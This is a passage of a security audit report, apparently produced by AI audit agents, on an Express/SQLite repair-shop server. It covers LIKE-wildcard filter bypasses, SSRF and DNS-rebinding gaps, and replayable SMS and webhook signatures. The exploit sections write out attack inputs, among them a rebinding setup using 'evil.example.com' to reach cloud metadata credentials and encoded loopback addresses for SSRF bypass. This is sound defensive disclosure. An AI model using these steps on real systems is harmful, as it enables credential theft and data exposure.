The installed Express version is 4.22.1 (confirmed via `package-lock.json`). CVE-2024-29041 (open-redirect via malformed `Host` header in `res.redirect()`) was fixed in Express 4.19.2. Version 4.22.1 is patched. No action required.

---

### INFO — PM2 `instances: 1, exec_mode: 'fork'` — cluster mode not used

**Where:** `ecosystem.config.js:76–77`

**What:**
PM2 is configured with a single fork process, not cluster mode (`instances: max` or `exec_mode: 'cluster'`). The rate limiting and session state are SQLite-backed and survive restarts correctly. The sticky-session / login-lockout-counter inconsistency risk from multi-worker cluster mode is not present in this deployment.

---

### INFO — TLS configuration is hardened correctly

**Where:** `packages/server/src/index.ts:649–676`

**What:**
TLS uses `minVersion: 'TLSv1.2'`, an explicit `ciphers` allowlist (ECDHE + AES-GCM + ChaCha20-Poly1305 only), and `honorCipherOrder: true`. The cipher suite matches Mozilla Intermediate profile. No weak ciphers (CBC-mode AES, RC4, DES) are included. HSTS is emitted in production at 180 days + `includeSubDomains`. `headersTimeout: 45_000` and `requestTimeout: 40_000` prevent slowloris-style attacks.

---

### INFO — `trust proxy` set to explicit IP allowlist, not `true`

**Where:** `packages/server/src/index.ts:631–634`, `packages/server/src/config.ts:342–348`

**What:**
`app.set('trust proxy', TRUST_PROXY_ALLOWLIST)` uses an explicit array of trusted proxy IPs from `TRUSTED_PROXY_IPS` env, falling back to `['loopback']`. This was previously `1` (trust first hop unconditionally). The tenantResolver (`middleware/tenantResolver.ts:81–100`) further validates `X-Forwarded-Host` only from socket IPs that appear in `config.trustedProxyIps`, using `req.socket.remoteAddress` (not `req.ip`), preventing X-Forwarded-Host spoofing from untrusted upstreams. The `localhostOnly` middleware (super-admin, management) also uses `req.socket.remoteAddress` directly, not `req.ip`.

---

### INFO — Stripe webhook correctly uses `express.raw()` before global JSON parser

**Where:** `packages/server/src/index.ts:1210–1212`

**What:**
The Stripe webhook is the only endpoint that uses `express.raw({ type: 'application/json', limit: '1mb' })` mounted before the global `express.json()`. The `billing.routes.ts` handler then calls `stripe.webhooks.constructEvent(req.body, sig, secret)` against the raw Buffer. This is the correct pattern — Stripe's SDK verifies the exact wire bytes, not a re-serialized object. The mounting order is confirmed safe.

---

### INFO — body-parser decompression limit enforced correctly

**Where:** `packages/server/src/index.ts:1228–1233`, `node_modules/body-parser/lib/read.js:63–79`

**What:**
Both `express.json({ limit: '1mb' })` and `express.urlencoded({ limit: '1mb' })` pass the `limit` option to `raw-body` which applies it to the **decompressed** stream. Verified by reading `body-parser/lib/read.js:64` (`opts.length = length`) and `getBody(stream, opts, ...)`. A gzip-compressed 10 KB body that expands to 2 MB will be rejected at 1 MB during decompression, before the full expanded payload is materialized. Decompression bomb risk is mitigated.

---

## Scope-cleared checklist

1. **HTTP request smuggling (CL + TE double-header):** Node's HTTP parser (in Node 22) rejects requests with both `Content-Length` and `Transfer-Encoding` headers by default (`--insecure-http-parser` is not set). No custom HTTP server or raw socket ingestion that could accept smuggled requests was found.
2. **CVE-2024-29041 (Express open redirect):** Express 4.22.1 installed, patched. Verified against `package-lock.json`.
3. **HTTP/2 Rapid Reset (CVE-2023-44487):** HTTP/2 not in use. `https.createServer()` is HTTP/1.1 only.
4. **Cluster + sticky sessions:** PM2 `instances: 1, exec_mode: 'fork'`. No multi-worker state inconsistency possible.
5. **trust proxy `true` (XFF spoofing):** Explicit IP allowlist used, fallback to loopback. Cross-checked in tenantResolver and localhostOnly.
6. **Decompression bomb via inflate:** body-parser 1.20.4 enforces the `limit` on decompressed size via `raw-body`. Confirmed by reading source.
7. **Stripe webhook raw-body ordering:** Correctly mounted before global JSON parser with `express.raw()`.
8. **TLS ciphers and minimum version:** Hardened with explicit allowlist, TLSv1.2 minimum, `honorCipherOrder`.
9. **Telnyx/Vonage rawBody availability:** Both send JSON (`application/json`); global `express.json()` verify callback captures `req.rawBody` correctly for these providers.
10. **slowloris / keep-alive abuse:** `headersTimeout: 45s`, `requestTimeout: 40s`, `keepAliveTimeout: 65s` all explicitly set. Adequate protection.


---

# T09-json-injection

# T09 — JSON Path Injection & FTS5 MATCH Audit

**Slot:** T09  
**Scope:** `json_extract`, `json_each`, `json_tree`, `json_set`, `json_remove`, `json_object`, `json_array`, `json_type`, `FTS5 MATCH`, `fts_` — across all server routes and services.

---

## Summary of Findings

| # | Severity | Short Title |
|---|----------|-------------|
| 1 | LOW | `repairPricing /services` LIKE missing `ESCAPE` clause |
| 2 | LOW | `invoices /stats` LIKE escapes input but omits `ESCAPE` clause |
| 3 | LOW | `inventoryVariants bundles` LIKE escapes input but omits `ESCAPE` clause |
| 4 | LOW | `reports /tax-report.pdf` jurisdiction LIKE: no `escapeLike`, no `ESCAPE` |

---

### [LOW] repairPricing /services LIKE missing ESCAPE clause

**Where:** `packages/server/src/routes/repairPricing.routes.ts:511-514`

**What:**
`GET /api/v1/repair-pricing/services?q=…` routes the `q` query param into a LIKE pattern via `%${q.trim().toLowerCase()}%` without passing through `escapeLike()` and without appending `ESCAPE '\\'` to the SQL clause. SQLite's LIKE treats `%` and `_` as wildcards when no escape character is declared. A locally-defined `escapeLike()` function exists in the same file at line 82 but is not called here.

**Code:**
```typescript
// repairPricing.routes.ts:502-517
router.get('/services', asyncHandler(async (_req, res) => {
  const adb = _req.asyncDb;
  const { category, q } = _req.query as { category?: string; q?: string };
  let sql = 'SELECT * FROM repair_services WHERE 1=1';
  const params: any[] = [];
  if (q && typeof q === 'string' && q.trim().length > 0) {
    sql += " AND (LOWER(name) LIKE ? OR LOWER(COALESCE(category,'')) LIKE ?)";
    const like = `%${q.trim().toLowerCase()}%`;  // ← no escapeLike()
    params.push(like, like);                      // ← no ESCAPE '\' in SQL
  }
  sql += ' ORDER BY category ASC, sort_order ASC';
  const services = await adb.all(sql, ...params);
```

**Exploit:**
Any authenticated user (role: technician) sends `GET /api/v1/repair-pricing/services?q=%25` and the LIKE becomes `%% LIKE` which matches every row — the whole `repair_services` table is returned regardless of the category filter, turning the endpoint into a full-table dump. With `q=_` the caller can scan individual character positions across all service names (single-char wildcard enumeration). The route carries no role gate (`GET /services` is open to all authenticated users; only POST/PUT/DELETE require `adminOrManager`).

**Fix:**
Replace the pattern with `escapeLike(q.trim().toLowerCase())` (the function is already defined in the same file at line 82) and add `ESCAPE '\\'` to both LIKE predicates:
```sql
AND (LOWER(name) LIKE ? ESCAPE '\' OR LOWER(COALESCE(category,'')) LIKE ? ESCAPE '\')
```

---

### [LOW] invoices /stats LIKE escapes input but omits ESCAPE clause

**Where:** `packages/server/src/routes/invoices.routes.ts:369-375`

**What:**
`GET /api/v1/invoices/stats?keyword=…` (the KPI stats sub-endpoint) calls `escapeLike(keyword)` to produce backslash-escaped patterns but then omits `ESCAPE '\\'` from the four LIKE predicates. SQLite does not honor escape sequences unless told which character is the escape character — without the `ESCAPE` clause the inserted backslashes are treated as literal characters, not escape indicators. The main list endpoint (`GET /invoices`) at line 254 does this correctly with `ESCAPE '\\'`; the stats endpoint at line 372 does not.

**Code:**
```typescript
// invoices.routes.ts:369-376
if (keyword) {
  const esc = escapeLike(keyword);               // escapes % _ \ → \% \_ \\
  conditions.push(
    "(inv.order_id LIKE ? OR c.first_name LIKE ? OR c.last_name LIKE ? OR " +
    "(c.first_name || ' ' || c.last_name) LIKE ?)"  // ← ESCAPE '\' missing from all four
  );
  const pat = `%${esc}%`;
  params.push(pat, pat, pat, pat);
}
```

**Exploit:**
An authenticated user with `invoices.view` permission sends `GET /api/v1/invoices/stats?keyword=_&status=paid` — the `_` wildcard matches any single character, so all paid invoice stats are aggregated. Supplying `keyword=%` returns totals across all (non-void) invoices regardless of any other filter, leaking revenue aggregates more broadly than intended. The blast radius is limited to aggregate KPI numbers (not individual records) and requires authentication.

**Fix:**
Add `ESCAPE '\\'` to every LIKE predicate in the stats handler, mirroring the pattern already used in the list handler at line 254.

---

### [LOW] inventoryVariants bundles LIKE escapes input but omits ESCAPE clause

**Where:** `packages/server/src/routes/inventoryVariants.routes.ts:295-298`

**What:**
`GET /api/v1/inventory-variants/bundles?keyword=…` manually escapes the keyword with `keyword.replace(/[%_\\]/g, '\\$&')` but the two LIKE predicates in the dynamically-built `where` string carry no `ESCAPE '\\'` clause. Without the escape-char declaration SQLite ignores the backslashes and `%`/`_` still act as wildcards.

**Code:**
```typescript
// inventoryVariants.routes.ts:295-299
if (keyword) {
  where += ' AND (b.name LIKE ? OR b.sku LIKE ?)';  // ← no ESCAPE '\'
  const k = `%${keyword.replace(/[%_\\]/g, '\\$&')}%`;
  params.push(k, k);
}
```

**Exploit:**
Any authenticated user sends `GET /api/v1/inventory-variants/bundles?keyword=%` — the LIKE `%%` matches every active bundle row and bypasses intended search narrowing, returning the full bundles catalogue. `_` can be used as a single-character wildcard to enumerate bundles by partial name/SKU pattern.

**Fix:**
Add `ESCAPE '\\'` to both LIKE predicates:
```typescript
where += " AND (b.name LIKE ? ESCAPE '\\' OR b.sku LIKE ? ESCAPE '\\')";
```

---

### [LOW] reports /tax-report.pdf jurisdiction LIKE: no escapeLike, no ESCAPE

**Where:** `packages/server/src/routes/reports.routes.ts:2732,2743`

**What:**
`GET /api/v1/reports/tax-report.pdf?jurisdiction=…` builds a LIKE pattern `%${jurisdictionRaw}%` directly from `req.query.jurisdiction` without calling `escapeLike()` and without an `ESCAPE` clause. The endpoint is gated to admin/manager via `requireAdminOrManager()` so the attack surface is limited to privileged users, but those users can still cause unintended wide matches (e.g. `jurisdiction=%` matches all tax classes) or index-hostile patterns.

**Code:**
```typescript
// reports.routes.ts:2712, 2732, 2743
const jurisdictionRaw = String(req.query.jurisdiction || 'default').trim();
// ...
const jurisdictionPattern = `%${jurisdictionRaw}%`;  // ← no escapeLike()
// SQL:
'AND LOWER(COALESCE(tc.name, \'\')) LIKE LOWER(?)'   // ← no ESCAPE clause
```

**Exploit:**
An admin sends `GET /tax-report.pdf?jurisdiction=%` — the LIKE pattern `%%` matches every tax class row, so the filter is silently bypassed and the report includes all tax classes rather than a specific jurisdiction. A value like `_` matches any single-character class name, allowing confirmation of whether any one-character tax class names exist (low-impact info-leak). No SQL injection is possible because this is a parameterized query.

**Fix:**
Apply `escapeLike()` and add `ESCAPE '\\'`:
```typescript
const jurisdictionPattern = `%${escapeLike(jurisdictionRaw)}%`;
// SQL:
"AND LOWER(COALESCE(tc.name, '')) LIKE LOWER(?) ESCAPE '\\'"
```
Import `escapeLike` from `../utils/query.js` (already imported elsewhere in the file's dependency chain).

---

## Scope Cleared — Confirmed-Safe Checks

The following items were investigated and found to be secure:

1. **`json_extract` path in `auth.routes.ts:1166-1167, 2141-2142`** — `matchIdx` is the result of `Array.prototype.findIndex()` on a server-side array, always a non-negative integer. The path `'$[${matchIdx}]'` cannot be controlled by user input; the user-supplied backup `code` is only ever used as the bcrypt comparison operand (bound as `?`), never interpolated into the JSON path.

2. **FTS5 MATCH in `customers.routes.ts` and `search.routes.ts`** — Both files implement `ftsMatchExpr()` which (a) bounds input to 200 chars, (b) strips all characters except `[a-zA-Z0-9\s\-@.]` (no FTS5 operators survive: no `"`, `^`, `*`, `(`, `)`, `:`), and (c) wraps each token in double quotes (`"token"*`). Characters that pass through (`-`, `@`, `.`) are only special in FTS5 when they appear _outside_ quoted phrases; inside a quoted string they are literal. The match expression is then bound as a single `?` parameter, preventing any SQL-level injection.

3. **`json_object` / `json_array` in `import.routes.ts`** — All values in these calls are either string literals or bound `?` parameters (error message strings). No user-supplied values are interpolated into the JSON function arguments.

4. **`json_group_array` / `json_object` in `catalog.routes.ts:722`** — These aggregate a JOIN result from trusted database columns, not from request parameters.

5. **`json_set` / `json_remove` — no occurrences found** — Codebase does not use `json_set` or `json_remove` in any route except the `JSON_REMOVE` in `auth.routes.ts` which is safe (integer index, as described above).

6. **`json_each` / `json_tree` — no occurrences found** — Not used anywhere in the codebase; no JSON-each-based query DoS surface exists.

7. **LIKE in `tracking.routes.ts:269-273`** — Pattern is `%${last4}` where `last4 = digits.slice(-4)` and `digits = phone.replace(/\D/g, '')`. Stripping all non-digits guarantees `last4` can only contain `[0-9]` — no LIKE wildcards possible.

8. **LIKE in `tv.routes.ts:208-209`** — Patterns are built from the hardcoded `IN_PROGRESS_KEYWORDS` and `READY_PICKUP_KEYWORDS` constants, not from any request parameter.

9. **LIKE in `reports.routes.ts:150-159`** — Hardcoded string literals (`'%hold%'`, `'%waiting%'`, etc.) — no user input.

10. **LIKE in `settings.routes.ts:1359,1371`** — `itemName` originates from a DB read (`inventory_items.name`), not from the HTTP request; these lines are inside a POST `/reconcile-cogs` admin handler that iterates over existing inventory records, not user-supplied names.


---

# T10-dns-rebinding

# T10 — DNS Rebinding, URL Parser Confusion, Request-Library SSRF Nuances

**Scope:** `utils/ssrfGuard.ts`, `geocode.routes.ts`, `services/cloudflareDns.ts`, `services/githubUpdater.ts`, `services/catalogScraper.ts`, `services/catalogSync.ts`, `services/walletPass.ts`, `services/repairShoprImport.ts`, `services/repairDeskImport.ts`, `services/myRepairAppImport.ts`, `services/email.ts`, `services/webhooks.ts`, `services/notifications.ts`  
**Investigator:** Agent T10  
**Date:** 2026-05-06

---

## IP-Pinning Verification

`assertPublicUrl` resolves DNS and validates all returned addresses, then returns `{ resolvedAddress, family }`. `fetchWithSsrfGuard` (the IP-pinning wrapper) installs an undici `Agent` with a `connect.lookup` callback that short-circuits to the pre-validated address, preventing re-resolution at connect time. **However, `fetchWithSsrfGuard` is never called anywhere in the codebase.** Every real fetch site calls `assertPublicUrl` then immediately invokes the global `fetch()`, which re-resolves DNS via the OS resolver. This exposes every SSRF-guarded call site to the DNS rebinding TOCTOU described below.

---

### [MEDIUM] webhooks.ts: SSRF guard run before each fetch attempt but connection not IP-pinned — DNS rebinding window

**Where:** `packages/server/src/services/webhooks.ts:284–305`

**What:**
`attemptDelivery` calls `assertWebhookUrl(url)` (lines 283–299) to validate DNS-resolved addresses, then immediately issues `fetch(url, ...)` (line 305) without binding the connection to the pre-validated IP. The OS resolver is re-invoked at TCP connect time. An admin who controls a domain's DNS can use a TTL=0 authoritative server to return a public IP for the guard's `dns.lookup` call and flip the answer to a private/reserved IP (e.g. `169.254.169.254`) by the time the undici connection handler resolves the same hostname milliseconds later. Unlike `catalogScraper.ts`, the webhook target URL is admin-configurable (`store_config.webhook_url`) and `redirect: 'error'` is set, but IP pinning is absent.

**Code:**
```typescript
// webhooks.ts:283-305
try {
  await assertWebhookUrl(url);   // DNS check → validates IPs once
} catch (err: unknown) {
  // ... SSRF block logged ...
  return { ok: false, ... };
}
// gap: OS re-resolves DNS here; if TTL=0 DNS flipped to private IP, guard is bypassed
const res = await fetch(url, {
  method: 'POST',
  redirect: 'error',   // redirects blocked, but DNS rebinding still possible
  ...
});
```

**Exploit:**
Admin configures `webhook_url = http://evil.example.com/` where `evil.example.com` is served by an attacker-controlled TTL=0 DNS server. First assertion: DNS returns `1.2.3.4` (public) → guard passes. Between guard return and fetch connect (< 1 ms), DNS is flipped to `169.254.169.254` → the TCP connection reaches AWS IMDS. The server POSTs the signed event payload (including tenant data) to the IMDS endpoint and may receive cloud credentials in the response. Re-run on every retry attempt since the guard fires once per attempt.

**Fix:**
Replace `assertWebhookUrl(url)` + `fetch(url, ...)` with `fetchWithSsrfGuard(url, { method: 'POST', redirect: 'error', body, headers, timeoutMs: ATTEMPT_TIMEOUT_MS })` from `ssrfGuard.ts:190`. This pins the undici connection to the pre-validated IP address, closing the TOCTOU window entirely.

---

### [LOW] fetchWithSsrfGuard defined but never called — IP pinning dead code

**Where:** `packages/server/src/utils/ssrfGuard.ts:190–229`

**What:**
`fetchWithSsrfGuard` implements correct DNS-rebinding defence by installing a per-request undici `Agent` whose `connect.lookup` callback returns the pre-validated IP, ensuring the OS resolver is never consulted at connect time. This is exactly the fix needed for `catalogScraper.ts` and `webhooks.ts`. However, `fetchWithSsrfGuard` is exported but has zero callers in the entire codebase — both existing SSRF-guarded fetch sites call `assertPublicUrl` directly and then use the global `fetch()`. The defensive wrapper provides no protection in its current state.

**Code:**
```typescript
// ssrfGuard.ts:190 — exported, never imported anywhere else
export async function fetchWithSsrfGuard(
  url: string,
  init: RequestInit & { timeoutMs?: number } = {},
): Promise<Response> {
  const { resolvedAddress, family } = await assertPublicUrl(url);
  // ... installs pinnedAgent with lookup callback ...
}
// Zero grep results for fetchWithSsrfGuard outside this file
```

**Exploit:**
Indirect — the dead code means all current SSRF-guarded fetch sites lack IP pinning. See webhooks.ts MEDIUM and catalogScraper.ts LOW (S15) for concrete exploitation paths.

**Fix:**
Replace `assertPublicUrl` + `fetch` call-pairs in `catalogScraper.ts:414–417` and `webhooks.ts:284–305` with `fetchWithSsrfGuard`. Remove the two-step pattern from the codebase to prevent future sites from copying the unsafe pattern.

---

### [LOW] isPrivateIPv6 does not block deprecated IPv6 site-local range fec0::/10

**Where:** `packages/server/src/utils/ssrfGuard.ts:96–101`, mirrored at `services/webhooks.ts:98–103`

**What:**
`isPrivateIPv6` blocks `fc00::/7` (ULA, prefix `f[cd]`) and `fe80::/10` (link-local, prefix `fe[89ab]`). It does not block `fec0::/10` (deprecated site-local, RFC 3879 §4), whose second byte ranges from `0xc0` to `0xff` — the first hex nibble of the second byte is `c` through `f`, which is not matched by `[89ab]` and not caught by `^f[cd]` (which only covers `fc` and `fd`, not `fe`). If a DNS server returns an address in `fec0::/10`, `isPrivateIPv6` returns `false` and the address is treated as public. Site-local addresses were deprecated in 2004 but some enterprise networks still route them.

**Code:**
```typescript
// ssrfGuard.ts:95-101
if (/^f[cd][0-9a-f]{2}:/.test(normalized)) return true;   // fc00::/7 ULA
if (/^fe[89ab][0-9a-f]:/.test(normalized)) return true;    // fe80::/10 link-local
// fec0::/10 (fe[c-f][0-9a-f]):  not matched by either pattern → returns false
return false;
```

**Exploit:**
Requires an environment where `fec0::/10` addresses are routed to internal services and a DNS server returns such an address. Not exploitable in most deployments (site-local is deprecated/unrouted). An attacker-controlled DNS returning `fec0::1` as the resolved address for a webhook target would bypass the guard on vulnerable networks.

**Fix:**
Add `/^fe[c-f][0-9a-f]{2}:/.test(normalized)` or the broader check `/^fe[89a-f][0-9a-f]{2}:/.test(normalized)` to `isPrivateIPv6` to cover the full `fe80::/10` through `feff::/16` range. Update both `ssrfGuard.ts` and the duplicated logic in `webhooks.ts`.

---

### [INFO] Hex/octal/decimal IPv4 literals safely normalized by WHATWG URL parser

**Where:** `packages/server/src/utils/ssrfGuard.ts:119–139`

**What:**
`assertPublicUrl` uses `new URL(url)` before extracting `parsed.hostname`. Node 22's WHATWG URL implementation normalizes non-standard IPv4 notation in URLs to dotted-decimal form before parsing: `http://0x7f000001/` → hostname `127.0.0.1`; `http://2130706433/` (decimal) → `127.0.0.1`; `http://017700000001/` (octal) → `127.0.0.1`; `http://127.1/` (short form) → `127.0.0.1`. All of these are then caught by `net.isIP(hostname) === 4` followed by `isPrivateIPv4('127.0.0.1') === true`. Alternate non-standard IP forms are **not a bypass** on this Node version.

**Code:**
```typescript
// Node 22 URL parser: verified via node -e
// new URL('http://0x7f000001/').hostname  →  '127.0.0.1'
// new URL('http://2130706433/').hostname  →  '127.0.0.1'
// new URL('http://017700000001/').hostname  →  '127.0.0.1'
// All caught by isPrivateIPv4 check in assertPublicUrl
```

**Exploit:**
None — the URL parser normalization closes this attack vector on Node 22. Would need re-verification on a Node version that doesn't normalize (Node < 18 had inconsistencies). Hardening recommendation: add an explicit blocklist test for these forms if the codebase is expected to run on Node < 18.

---

### [INFO] Wildcard DNS services (nip.io, sslip.io) mitigated by DNS resolution check

**Where:** `packages/server/src/utils/ssrfGuard.ts:141–172`, `services/webhooks.ts:179–203`

**What:**
Wildcard DNS services like `127.0.0.1.nip.io` and `127.0.0.1.sslip.io` resolve to `127.0.0.1`. An attacker could configure `webhook_url = http://127.0.0.1.nip.io/` hoping the hostname pattern check misses the numeric IP-in-name. Both `assertPublicUrl` and `assertWebhookUrl` call `dns.lookup(hostname, { all: true })` and check every returned IP against the private ranges. Since `127.0.0.1.nip.io` resolves to `127.0.0.1`, `isPrivateIPv4('127.0.0.1') === true` and the URL is blocked. The DNS-resolution approach catches this class of bypass by design.

**Code:**
```typescript
// assertPublicUrl: resolves all IPs, checks each one
for (const { address, family } of addresses) {
  const blocked = family === 4 ? isPrivateIPv4(address) : isPrivateIPv6(address);
  if (blocked) throw new Error(`ssrf: blocked private/reserved ip ${address} (from ${hostname})`);
}
```

**Exploit:**
None — DNS-resolution-based guard correctly blocks wildcard DNS bypass.

---

### [INFO] IDN homograph attack mitigated by DNS resolution — resolved IP is checked not hostname label

**Where:** `packages/server/src/utils/ssrfGuard.ts:141–172`

**What:**
An IDN homograph attack uses a Punycode domain whose Unicode rendering looks identical to a legitimate domain (e.g. `xn--internal-look-alike.com` visually matches `internal.example.com`). The WHATWG URL parser preserves Punycode labels as-is in `hostname`. The guard's `dns.lookup` call resolves the Punycode hostname via the OS IDNA resolver; if the domain resolves to a private IP, `isPrivateIPv4` / `isPrivateIPv6` catches it. IDN homographs that actually resolve to private IPs are blocked. Domains designed to look like internal names but resolving to public IPs are harmless to the guard.

---

### [INFO] IPv6 literal URLs blocked via ENOTFOUND, not via isPrivateIPv6 policy check

**Where:** `packages/server/src/utils/ssrfGuard.ts:130–139`

**What:**
`new URL('http://[::1]/').hostname` returns `'[::1]'` (with brackets, per WHATWG spec). `net.isIP('[::1]') === 0`, so the guard skips the IP-literal fast path and falls through to `dns.lookup('[::1]', { all: true })`, which returns `ENOTFOUND`. The URL is correctly rejected but with the error message `ssrf: dns lookup failed` rather than `ssrf: blocked private/reserved ip`. The `isPrivateIPv6` function is never reached for bracketed IPv6 literals in practice. This is a correctness gap (wrong error code) but not a security bypass since the connection is still rejected.

**Fix (cosmetic):** Strip brackets from the hostname before the `net.isIP` check: `const rawHost = hostname.startsWith('[') && hostname.endsWith(']') ? hostname.slice(1, -1) : hostname;` then pass `rawHost` to `net.isIP`. Apply the same fix in `webhooks.ts`.

---



---

# T11-webhook-precision

# T11 — Webhook Signature Replay Window Precision + Clock Skew + Dedup Retention

**Auditor:** Claude Sonnet 4.6 (security-audit slot T11)
**Scope:** `packages/server/src/services/stripe.ts`, `services/webhooks.ts`, `providers/sms/twilio.ts`, `providers/sms/bandwidth.ts`, `providers/sms/vonage.ts`, `providers/sms/plivo.ts`, `providers/sms/telnyx.ts`, `routes/voice.routes.ts`, `routes/billing.routes.ts`, `index.ts`

---

### [HIGH] Plivo V3 nonce never stored — captured webhook is replayable indefinitely

**Where:** `packages/server/src/providers/sms/plivo.ts:88–115`

**What:**
Plivo V3 webhook authentication signs: `HMAC-SHA256(authToken, url + sorted_params + '.' + nonce)`. The `X-Plivo-Signature-V3-Nonce` header is a UUID generated by Plivo once per request and embedded in the signed string. Because the server never stores seen nonces in a deduplication table, the nonce provides no replay protection: an attacker who captures a complete (url, params, nonce, signature) tuple from a legitimate Plivo request can re-POST the identical request at any point in the future. The HMAC will verify successfully every time.

**Code:**
```typescript
// plivo.ts:88-113
verifyWebhookSignature(req: any): boolean {
  const signature = req.headers['x-plivo-signature-v3'];
  const nonce = req.headers['x-plivo-signature-v3-nonce'];
  if (!signature || !nonce) return false;
  const url = `${req.protocol}://${req.get('host')}${req.originalUrl}`;
  const params = req.body && typeof req.body === 'object' ? req.body : {};
  const sortedKeys = Object.keys(params).sort();
  let paramString = '';
  for (const key of sortedKeys) { paramString += key + (params[key] ?? ''); }
  const baseString = url + paramString + '.' + nonce;
  const expected = crypto.createHmac('sha256', this.authToken).update(baseString).digest('base64');
  // nonce is NEVER recorded as "seen" — same request can be replayed forever
  const sigBuf = Buffer.from(signature, 'base64');
  const expectedBuf = Buffer.from(expected, 'base64');
  if (sigBuf.length !== expectedBuf.length) return false;
  return crypto.timingSafeEqual(sigBuf, expectedBuf);
}
```

**Exploit:**
Attacker intercepts one legitimate Plivo inbound-SMS webhook via network sniffing, a compromised endpoint, or a log leak. They re-POST the same body and headers (including `X-Plivo-Signature-V3-Nonce` and `X-Plivo-Signature-V3`) to `/api/v1/sms/inbound-webhook` at any later time. Verification passes unconditionally. Replaying `invoice_paid` or inbound-payment-confirmation SMS events can manipulate ticket state, trigger auto-responses, or inject fraudulent messages into the tenant's conversation history.

**Fix:**
Maintain a `seen_plivo_nonces` table (or in-memory TTL set with a 10-minute window). Before accepting a request, INSERT OR IGNORE the nonce with a timestamp; reject if already seen. Prune entries older than the replay window. Alternatively, check that the nonce is a recent UUID by also verifying a timestamp field if Plivo adds one in future versions. At minimum, document the infinite replay window as a known risk.

---

### [MEDIUM] Twilio webhook signing has no timestamp — requests are replayable without bound

**Where:** `packages/server/src/providers/sms/twilio.ts:88–111`

**What:**
Twilio's `X-Twilio-Signature` scheme signs `HMAC-SHA1(authToken, url + sorted_POST_params)` with no timestamp component. The server correctly reconstructs the signed string and compares with constant-time comparison, but there is no freshness check on the request. A captured Twilio webhook (e.g. a legitimate `inbound-SMS` POST) can be replayed to the server days or months later and will pass signature verification. The only defence is that the URL must be guessable (it's a well-known path).

**Code:**
```typescript
// twilio.ts:88-111
verifyWebhookSignature(req: any): boolean {
  const signature = req.headers['x-twilio-signature'];
  if (!signature) return false;
  const url = `${req.protocol}://${req.get('host')}${req.originalUrl}`;
  const params = req.body || {};
  const sortedKeys = Object.keys(params).sort();
  let data = url;
  for (const key of sortedKeys) { data += key + params[key]; }
  const expected = crypto.createHmac('sha1', this.authToken).update(data).digest('base64');
  // No timestamp check — HMAC is valid forever
  const sigBuf = Buffer.from(signature);
  const expBuf = Buffer.from(expected);
  if (sigBuf.length !== expBuf.length) return false;
  return crypto.timingSafeEqual(sigBuf, expBuf);
}
```

**Exploit:**
An attacker intercepts a legitimate inbound Twilio webhook (e.g., a customer's SMS to the shop). They replay the same POST days later. Signature passes; the route creates duplicate inbound messages, triggers duplicate auto-responses, and may cause double-entry in conversation history or double-triggered automations. SMS-triggered workflows (e.g., status-change keywords) would fire twice.

**Fix:**
Add per-request deduplication keyed on `MessageSid` (already in the payload) with a 24-hour TTL table. Alternatively, store `MessageSid` in the inbound messages table with a UNIQUE constraint and use INSERT OR IGNORE semantics. For voice webhooks, `CallSid` serves the same role. Twilio does not include a replay-prevention timestamp in its signing scheme, so message-ID deduplication is the correct mitigation.

---

### [MEDIUM] Vonage legacy SMS webhook includes `timestamp` param but server never validates freshness

**Where:** `packages/server/src/providers/sms/vonage.ts:220–258`

**What:**
Vonage's SMS API includes a `timestamp` query parameter (Unix epoch integer) in signed webhook requests, and this parameter is included in the sorted-params HMAC. However, `verifyWebhookSignature` never checks whether `timestamp` falls within a freshness window. A captured Vonage SMS webhook with its full query params (including `timestamp` and `sig`) can be replayed indefinitely: the HMAC will verify because the identical timestamp value is re-signed identically.

**Code:**
```typescript
// vonage.ts:220-258
const sig = req.query?.sig;
if (sig) {
  const params = { ...req.query };
  delete params.sig;
  const sorted = Object.keys(params).sort();
  let sigString = '';
  for (const key of sorted) { sigString += key + params[key]; }
  // 'timestamp' param IS in sorted — but freshness is NEVER checked:
  // if (parseInt(params.timestamp, 10) < Date.now()/1000 - 300) return false; ← MISSING
  expected = crypto.createHmac(algo, this.signatureSecret).update(sigString).digest('hex');
  ...
  return crypto.timingSafeEqual(sigBuf, expectedBuf);
}
```

**Exploit:**
An attacker who intercepts a Vonage SMS-API webhook request (including full query string with `timestamp` and `sig`) can replay it at any future time. The HMAC passes because the signed string is identical. This can inject duplicate inbound messages or duplicate status callbacks (e.g., `message_status=delivered` replayed to falsely mark an undelivered message as delivered).

**Fix:**
After signature verification passes, parse `params.timestamp` as a Unix epoch integer and check: `Math.abs(Date.now() / 1000 - ts) > 300`. Reject with `403` if outside the 5-minute window. This matches the Telnyx implementation (`telnyx.ts:110–113`) which already enforces a freshness window. Also add a `MessageId` deduplication check for belt-and-suspenders.

---

### [MEDIUM] `retryDeliveryFailure` reuses original payload timestamp — freshness-checking receivers reject retries

**Where:** `packages/server/src/services/webhooks.ts:517–590`

**What:**
When an operator manually retries a dead-lettered outbound webhook, `retryDeliveryFailure` reconstructs the HMAC signature using the _original_ `timestamp` stored in the payload JSON (line 538–551). The retry POSTs the same `X-Webhook-Timestamp` value from hours or days ago. Any receiver that enforces a freshness window on `X-Webhook-Timestamp` (a common practice recommended by Stripe, Svix, and Standard Webhooks) will reject the replayed timestamp and return a 4xx, causing the retry to appear as a network failure. The operator retries again, the same stale timestamp is used, and the delivery can never succeed. Separately, a freshness-unaware receiver that accepts the stale timestamp is then left with a signature they can replay indefinitely.

**Code:**
```typescript
// webhooks.ts:533-556
// Payload stored in DB is the JSON-serialised WebhookPayload (including the
// original `timestamp` field). Reuse that timestamp so signature matches
// anything a receiver cached at original delivery time.
let timestamp: string;
const parsed = JSON.parse(row.payload) as { timestamp?: string };
timestamp = parsed.timestamp; // ← original timestamp from hours/days ago

const secret = getOrCreateWebhookSecret(db);
const signedInput = `${timestamp}.${row.payload}`;
const signature = crypto.createHmac('sha256', secret).update(signedInput).digest('hex');

const result = await attemptDelivery(row.endpoint, row.payload, signature, timestamp);
// X-Webhook-Timestamp header sent = original stale timestamp
```

**Exploit:**
Two attack surfaces: (1) An operator retries a dead-lettered webhook — receiver with a 5-minute freshness window rejects it, creating a permanent delivery failure that masquerades as a transient network error. Support engineers think the receiver is broken; the actual data was never delivered. (2) A freshness-ignorant receiver that accepts the retry now holds a valid (timestamp, signature) pair from the past that an attacker who compromised the dead-letter table can replay later.

**Fix:**
On retry, recompute a fresh `timestamp = new Date().toISOString()` and re-sign: `signedInput = ${freshTimestamp}.${row.payload}`. Send the new `X-Webhook-Timestamp` header with the fresh value. The payload body and event type are unchanged (maintaining idempotency at the application layer), but the signature timestamp is current. Update the stored `payload` in the dead-letter row if re-signing (so a second retry also uses a fresh timestamp).

---

